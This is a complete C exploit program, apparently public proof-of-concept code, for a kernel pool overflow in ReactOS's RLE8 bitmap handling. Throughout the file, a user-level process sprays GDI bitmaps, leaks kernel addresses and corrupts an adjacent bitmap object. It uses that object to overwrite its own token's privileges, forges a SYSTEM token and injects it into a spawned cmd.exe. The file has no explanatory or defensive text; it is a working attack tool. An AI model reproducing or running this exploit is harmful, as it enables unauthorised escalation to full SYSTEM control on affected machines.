

#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <string.h>


#define SystemHandleInformation     16
#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004)
#define ProcessAccessToken_Class    9
#define OFF_PRIVCOUNT  0x54
#define OFF_PRIVS      0x74

typedef struct {
    ULONG Length; HANDLE RootDirectory; PVOID ObjectName;
    ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;
} MYOA;
typedef struct {
    USHORT Pid; USHORT BackTrace; UCHAR TypeIdx; UCHAR Attr;
    USHORT Handle; PVOID Object; ULONG Access;
} HENTRY;
typedef struct { ULONG Count; HENTRY H[1]; } HINFO;
typedef struct { HANDLE Token; HANDLE Thread; } TOKINFO;

typedef LONG(NTAPI *tNtQSI)(ULONG,PVOID,ULONG,PULONG);
typedef LONG(NTAPI *tNtOPT)(HANDLE,ACCESS_MASK,PHANDLE);
typedef LONG(NTAPI *tNtSIP)(HANDLE,ULONG,PVOID,ULONG);
typedef LONG(NTAPI *tNtCT)(PHANDLE,ACCESS_MASK,MYOA*,TOKEN_TYPE,
    PLUID,PLARGE_INTEGER,PTOKEN_USER,PTOKEN_GROUPS,
    PTOKEN_PRIVILEGES,PTOKEN_OWNER,PTOKEN_PRIMARY_GROUP,
    PTOKEN_DEFAULT_DACL,PTOKEN_SOURCE);

static tNtQSI xNtQSI;
static tNtOPT xNtOPT;
static tNtSIP xNtSIP;
static tNtCT  xNtCT;

static void resolve(void)
{
    HMODULE n = GetModuleHandleA("ntdll.dll");
    xNtQSI = (tNtQSI)GetProcAddress(n,"NtQuerySystemInformation");
    xNtOPT = (tNtOPT)GetProcAddress(n,"NtOpenProcessToken");
    xNtSIP = (tNtSIP)GetProcAddress(n,"NtSetInformationProcess");
    xNtCT  = (tNtCT) GetProcAddress(n,"NtCreateToken");
}


typedef struct {
    PVOID KernelData;
    DWORD ProcessId;
    union {
        LONG  Type;
        struct { USHORT FullUnique; UCHAR Objt; UCHAR Flags; };
    };
    PVOID UserData;
} GDICELL;

static inline PVOID get_peb(void)
{
    PVOID p;
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(p));
    return p;
}

static GDICELL *g_gdi_table;

static void init_gdi_table(void)
{
    BYTE *peb = (BYTE*)get_peb();
    g_gdi_table = *(GDICELL**)(peb + 0x94);
}

static DWORD gdi_kaddr(HGDIOBJ h)
{
    DWORD idx = (DWORD)(ULONG_PTR)h & 0xFFFF;
    return (DWORD)(ULONG_PTR)g_gdi_table[idx].KernelData;
}


static HINFO *dump_handles(void)
{
    ULONG sz = 0x40000; HINFO *h; LONG s;
    for(;;) {
        h = (HINFO*)VirtualAlloc(0,sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!h) return 0;
        s = xNtQSI(SystemHandleInformation,h,sz,0);
        if(s == STATUS_INFO_LENGTH_MISMATCH) {
            VirtualFree(h,0,MEM_RELEASE); sz<<=1;
            if(sz > 0x4000000) return 0;
            continue;
        }
        return s<0 ? (VirtualFree(h,0,MEM_RELEASE),(HINFO*)0) : h;
    }
}

static DWORD find_obj(HINFO *h, DWORD pid, DWORD hv)
{
    ULONG i;
    for(i=0; i<h->Count; i++)
        if(h->H[i].Pid==(USHORT)pid && h->H[i].Handle==(USHORT)hv)
            return (DWORD)(ULONG_PTR)h->H[i].Object;
    return 0;
}


#define SIZEOF_SURFACE      0x78
#define SIZEOF_POOL_HDR     8
#define POOL_BLOCK_SZ       (SIZEOF_POOL_HDR + SIZEOF_SURFACE)

#define S_HMGR          0x00
#define S_SHARECOUNT    0x04
#define S_EXCLOCK       0x08
#define S_BASEFLAGS     0x0A
#define S_PUSHLOCK      0x0C
#define S_SIZL_CX       0x20
#define S_SIZL_CY       0x24
#define S_CJBITS        0x28
#define S_PVBITS        0x2C
#define S_PVSCAN0       0x30
#define S_LDELTA        0x34
#define S_IUNIQ         0x38
#define S_IBMPFMT       0x3C
#define S_ITYPE         0x40
#define S_FJBITMAP      0x42
#define S_FLAGS         0x44
#define S_PPAL          0x48

#define API_BITMAP          0x04000000
#define BASEFLAG_LOOKASIDE  0x80
#define BMF_8BPP            3

#define OV_W    65536
#define OV_H    65536


#define SPRAY_N  3000

static HBITMAP g_spray[SPRAY_N];
static DWORD   g_kaddr[SPRAY_N];

static void spray_create(HDC hdc)
{
    BITMAPINFOHEADER bi;
    void *pBits;
    int i;

    memset(&bi, 0, sizeof(bi));
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = 1;
    bi.biHeight      = 1;
    bi.biPlanes      = 1;
    bi.biBitCount    = 32;
    bi.biCompression = BI_RGB;

    for (i = 0; i < SPRAY_N; i++) {
        g_spray[i] = CreateDIBSection(hdc, (BITMAPINFO*)&bi,
            DIB_RGB_COLORS, &pBits, NULL, 0);
    }
}

static int spray_find_adjacent(int *pA, int *pB)
{
    int i, j;
    for (i = 0; i < SPRAY_N; i++)
        g_kaddr[i] = gdi_kaddr(g_spray[i]);

    for (i = 0; i < SPRAY_N; i++) {
        if (!g_kaddr[i]) continue;
        for (j = 0; j < SPRAY_N; j++) {
            if (i == j || !g_kaddr[j]) continue;
            if (g_kaddr[j] - g_kaddr[i] == POOL_BLOCK_SZ) {
                *pA = i; *pB = j;
                return 1;
            }
        }
    }
    return 0;
}


#define PAYLOAD_SZ  84
#define RLE_DATA_SZ (2 + PAYLOAD_SZ + 2)

static void build_rle(BYTE *rle, HBITMAP hB, DWORD target_addr)
{
    BYTE payload[PAYLOAD_SZ];
    memset(payload, 0, PAYLOAD_SZ);

    *(USHORT*)(payload + 0) = 0x0010;
    *(USHORT*)(payload + 2) = 0x0610;
    payload[4] = 'G'; payload[5] = 'h'; payload[6] = '0'; payload[7] = '5';

    *(DWORD*)(payload + 8)  = (DWORD)(ULONG_PTR)hB;
    *(DWORD*)(payload + 12) = 1;
    *(USHORT*)(payload + 16) = 0;
    *(USHORT*)(payload + 18) = 0;
    *(DWORD*)(payload + 20) = 0;

    #define PL(surf_off) (8 + (surf_off))

    *(DWORD*)(payload + PL(S_SIZL_CX)) = 40;
    *(DWORD*)(payload + PL(S_SIZL_CY)) = 1;
    *(DWORD*)(payload + PL(S_CJBITS))  = 40;
    *(DWORD*)(payload + PL(S_PVBITS))  = target_addr;
    *(DWORD*)(payload + PL(S_PVSCAN0)) = target_addr;
    *(DWORD*)(payload + PL(S_LDELTA))  = 40;
    *(DWORD*)(payload + PL(S_IBMPFMT)) = BMF_8BPP;
    *(USHORT*)(payload + PL(S_ITYPE))  = 0;
    *(USHORT*)(payload + PL(S_FJBITMAP)) = 0;
    *(DWORD*)(payload + PL(S_FLAGS))   = API_BITMAP;

    #undef PL

    rle[0] = 0;
    rle[1] = PAYLOAD_SZ;
    memcpy(rle + 2, payload, PAYLOAD_SZ);
    rle[2 + PAYLOAD_SZ] = 0;
    rle[2 + PAYLOAD_SZ + 1] = 1;
}


static SID sid_sys = {1,1,{0,0,0,0,0,5},{18}};
static struct { SID s; DWORD x; } sid_adm = {{1,2,{0,0,0,0,0,5},{32}},544};
static SID sid_au  = {1,1,{0,0,0,0,0,5},{11}};
static SID sid_wd  = {1,1,{0,0,0,0,0,1},{0}};

static HANDLE forge_token(PLUID auth)
{
    HANDLE tok = 0;
    LARGE_INTEGER exp; exp.QuadPart = 0x7FFFFFFFFFFFFFFFLL;

    TOKEN_USER tu; tu.User.Sid = &sid_sys; tu.User.Attributes = 0;

    struct { DWORD n; SID_AND_ATTRIBUTES g[3]; } grp;
    grp.n = 3;
    grp.g[0].Sid = (PSID)&sid_adm;
    grp.g[0].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;
    grp.g[1].Sid = &sid_au;
    grp.g[1].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;
    grp.g[2].Sid = &sid_wd;
    grp.g[2].Attributes = SE_GROUP_ENABLED|SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;

    static const DWORD pl[] = {2,3,5,7,8,9,10,11,12,13,14,15,17,18,19,20,22,23,24,25,28,29};
    int np = sizeof(pl)/sizeof(pl[0]), i;

    BYTE pb[sizeof(DWORD)+22*sizeof(LUID_AND_ATTRIBUTES)];
    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES*)pb;
    tp->PrivilegeCount = np;
    for(i=0;i<np;i++) {
        tp->Privileges[i].Luid.LowPart = pl[i];
        tp->Privileges[i].Luid.HighPart = 0;
        tp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    }

    TOKEN_OWNER to; to.Owner = &sid_sys;
    TOKEN_PRIMARY_GROUP tpg; tpg.PrimaryGroup = &sid_sys;

    BYTE db[256]; PACL dacl = (PACL)db;
    InitializeAcl(dacl,256,ACL_REVISION);
    AddAccessAllowedAce(dacl,ACL_REVISION,GENERIC_ALL,&sid_sys);
    AddAccessAllowedAce(dacl,ACL_REVISION,GENERIC_ALL,(PSID)&sid_adm);
    TOKEN_DEFAULT_DACL tdd; tdd.DefaultDacl = dacl;

    TOKEN_SOURCE ts;
    memcpy(ts.SourceName,"SiCk\0\0\0\0",TOKEN_SOURCE_LENGTH);
    AllocateLocallyUniqueId(&ts.SourceIdentifier);

    SECURITY_QUALITY_OF_SERVICE sq;
    sq.Length = sizeof(sq); sq.ImpersonationLevel = SecurityAnonymous;
    sq.ContextTrackingMode = SECURITY_STATIC_TRACKING; sq.EffectiveOnly = FALSE;

    MYOA oa; memset(&oa,0,sizeof(oa));
    oa.Length = sizeof(oa); oa.SecurityQualityOfService = &sq;

    LONG st = xNtCT(&tok,TOKEN_ALL_ACCESS,&oa,TokenPrimary,auth,&exp,
        &tu,(PTOKEN_GROUPS)&grp,tp,&to,&tpg,&tdd,&ts);

    if(st<0) return 0;
    return tok;
}


static void banner(void)
{
    printf("\n");
    printf("    _._     _,-'\"\"\"``-._\n");
    printf("   (,-.`._,'(       |\\`-/|\n");
    printf("       `-.-' \\ )-`( , o o)\n");
    printf("             `-    \\`_`\"'-\n");
    printf("\n");
    printf("   RLE BITMAP POOL OVERFLOW LPE\n");
    printf("   ReactOS i386 - user to SYSTEM\n");
    printf("   _SiCk // afflicted.sh\n");
    printf("\n");
}


int main(void)
{
    DWORD pid, ka; LONG s;
    HANDLE htok, sys, ctok;
    HINFO *hi;
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    TOKINFO ti;
    BYTE buf[256]; DWORD len;
    LPSTR ss;
    HDC hdc;
    int idxA, idxB;

    setvbuf(stdout,0,_IONBF,0);
    banner();

    resolve();
    if(!xNtQSI||!xNtOPT||!xNtSIP||!xNtCT) { printf("[!] ntdll\n"); return 1; }

    init_gdi_table();
    if(!g_gdi_table) { printf("[!] GDI handle table\n"); return 1; }

    pid = GetCurrentProcessId();
    hdc = GetDC(NULL);
    if(!hdc) { printf("[!] GetDC\n"); return 1; }

    s = xNtOPT((HANDLE)-1,TOKEN_ALL_ACCESS,&htok);
    if(s<0) { printf("[!] %08lX\n",(DWORD)s); return 1; }

    LUID auth = {0,0};
    if(GetTokenInformation(htok,TokenStatistics,buf,sizeof(buf),&len))
        auth = ((TOKEN_STATISTICS*)buf)->AuthenticationId;

    if(GetTokenInformation(htok,TokenUser,buf,sizeof(buf),&len)) {
        ConvertSidToStringSidA(((TOKEN_USER*)buf)->User.Sid,&ss);
        printf("[*] %s\n",ss?ss:"?"); if(ss) LocalFree(ss);
    }

    hi = dump_handles();
    if(!hi) { printf("[!] handles\n"); return 1; }
    ka = find_obj(hi,pid,(DWORD)(ULONG_PTR)htok);
    VirtualFree(hi,0,MEM_RELEASE);
    if(!ka) { printf("[!] token\n"); return 1; }
    printf("[+] TOKEN %08lX\n",ka);

    ZeroMemory(&si,sizeof(si)); si.cb=sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    if(!CreateProcessA("C:\\ReactOS\\system32\\cmd.exe",0,0,0,0,
        CREATE_SUSPENDED|CREATE_NEW_CONSOLE,0,"C:\\",&si,&pi))
    { printf("[!] CreateProcess: %lu\n",GetLastError()); return 1; }
    printf("[*] child %lu\n",pi.dwProcessId);

    printf("[*] spraying %d bitmaps\n", SPRAY_N);
    spray_create(hdc);

    if(!spray_find_adjacent(&idxA, &idxB)) {
        printf("[!] no adjacent pair found\n");
        return 1;
    }

    HBITMAP hA = g_spray[idxA];
    HBITMAP hB = g_spray[idxB];
    DWORD kaA = g_kaddr[idxA];
    DWORD kaB = g_kaddr[idxB];

    printf("[+] A=%08lX B=%08lX (delta=%lu)\n", kaA, kaB, kaB - kaA);

    static const DWORD L[] = {2,3,5,7,8,9,10,11,12,13,14,15,17,18,19,20,22,23,24,25,28,29};
    int n = sizeof(L)/sizeof(L[0]), i;
    LUID_AND_ATTRIBUTES fp[22];
    for(i=0;i<n;i++) {
        fp[i].Luid.LowPart=L[i]; fp[i].Luid.HighPart=0;
        fp[i].Attributes = SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    }

    BYTE *pg = (BYTE*)VirtualAlloc(0,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    LUID_AND_ATTRIBUTES *privPage = (LUID_AND_ATTRIBUTES*)pg;
    memcpy(privPage, fp, n*sizeof(LUID_AND_ATTRIBUTES));
    DWORD privAddr = (DWORD)(ULONG_PTR)privPage;

    DWORD target = ka + OFF_PRIVCOUNT;
    BYTE rle[RLE_DATA_SZ];
    build_rle(rle, hB, target);

    printf("[*] target %08lX (token+0x%X)\n", target, OFF_PRIVCOUNT);

    DeleteObject(hA);
    g_spray[idxA] = NULL;

    BYTE bmi_buf[sizeof(BITMAPINFOHEADER) + 256*sizeof(RGBQUAD)];
    BITMAPINFO *bmi = (BITMAPINFO*)bmi_buf;
    memset(bmi_buf, 0, sizeof(bmi_buf));
    bmi->bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi->bmiHeader.biWidth       = OV_W;
    bmi->bmiHeader.biHeight      = OV_H;
    bmi->bmiHeader.biPlanes      = 1;
    bmi->bmiHeader.biBitCount    = 8;
    bmi->bmiHeader.biCompression = BI_RLE8;
    bmi->bmiHeader.biSizeImage   = RLE_DATA_SZ;

    printf("[*] SetDIBitsToDevice (RLE overflow)\n");
    SetDIBitsToDevice(hdc, 0, 0, 1, 1, 0, 0, 0, OV_H,
        rle, bmi, DIB_RGB_COLORS);

    printf("[+] overflow triggered\n");

    BYTE tokbuf[40];
    LONG ret;

    ret = GetBitmapBits(hB, 36, tokbuf);
    if(ret <= 0) {
        printf("[!] GetBitmapBits: %ld\n", ret);
        ResumeThread(pi.hThread);
        return 1;
    }
    printf("[+] read %ld bytes from token\n", ret);

    *(DWORD*)(tokbuf + 0x00) = (DWORD)n;
    *(DWORD*)(tokbuf + 0x20) = privAddr;

    ret = SetBitmapBits(hB, 36, tokbuf);
    if(ret <= 0) {
        printf("[!] SetBitmapBits: %ld\n", ret);
        ResumeThread(pi.hThread);
        return 1;
    }
    printf("[+] privs\n");

    sys = forge_token(&auth);
    if(!sys) { printf("[!] forge\n"); ResumeThread(pi.hThread); return 1; }
    printf("[+] token\n");

    ti.Token = sys; ti.Thread = 0;
    s = xNtSIP(pi.hProcess,ProcessAccessToken_Class,&ti,sizeof(ti));
    if(s<0) { printf("[!] swap %08lX\n",(DWORD)s); ResumeThread(pi.hThread); return 1; }

    ResumeThread(pi.hThread);
    Sleep(500);

    s = xNtOPT(pi.hProcess,TOKEN_QUERY,&ctok);
    if(s>=0) {
        if(GetTokenInformation(ctok,TokenUser,buf,sizeof(buf),&len)) {
            ConvertSidToStringSidA(((TOKEN_USER*)buf)->User.Sid,&ss);
            if(ss && !strcmp(ss,"S-1-5-18"))
                printf("[+] SYSTEM %lu\n",pi.dwProcessId);
            else
                printf("[!] %s\n",ss?ss:"?");
            if(ss) LocalFree(ss);
        }
        CloseHandle(ctok);
    }

    printf("[*] done\n");
    getchar();

    for(i = 0; i < SPRAY_N; i++)
        if(g_spray[i] && g_spray[i] != hB) DeleteObject(g_spray[i]);

    ReleaseDC(NULL, hdc);
    CloseHandle(sys); CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread); CloseHandle(htok);
    return 0;
}
